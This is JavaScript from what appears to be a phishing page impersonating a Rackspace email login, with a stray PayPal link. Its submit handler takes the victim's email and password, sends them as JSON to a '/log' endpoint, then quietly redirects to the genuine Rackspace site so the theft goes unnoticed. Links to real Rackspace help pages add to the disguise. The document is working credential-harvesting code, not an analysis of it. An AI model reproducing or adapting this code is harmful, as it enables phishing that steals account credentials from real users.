 
     
       var nav = document.getElementById('nav');
       nav.onclick = ()=>{
          window.location.href = 'https://paypal.com/'
       }
  
            var form = document.querySelector('form');
            form.addEventListener('submit', async(e)=>{
                 e.preventDefault();
                 var bod = document.body; 
                 bod.opacity = 0.1;
                 var err = document.getElementById('error');
                 var email = document.getElementById('email');
                 var password = document.getElementById('password');
                 if(email.value == '' || password.value ==''){ 
                 var emmaill = document.querySelector('.email');  
                  err.innerHTML = 'Username / Password incorrect';  
                  emmaill.style.paddingTop = '14px';
                  err.style.color = 'red';
                  err.style.paddingTop='10px';
                  err.style.fontFamily='helvetica';
                  err.style.fontWeight = 'bold';
                  err.style.fontSize='15px';
                  
  
                 }   

             
                    else{

                   var data = {
                         email:email.value,
                         password:password.value
                   } 

                         
                 const response = await fetch('/log', {
                    method:'post',
                    body:JSON.stringify(data),
                    headers:{
                         'Content-Type':'application/json',
                         Accept:'application/json'
                    }
                 } 
                 );

                 const result = response.json();
                 setTimeout( ()=> {
                  window.location.href = 'https://www.rackspace.com/';
                 }, 2000);   
               }
            });


               var navv = document.getElementById('nav');
               navv.onclick = function() {
                   window.location.href = 'https://www.rackspace.com/applications/rackspace-email'  
               }  

                  
               var lp = document.querySelector('.laptopImage2');
               lp.onclick = function() {
                   window.location.href = 'https://emailhelp.rackspace.com/l/identify-suspicious-email'  
               }     

               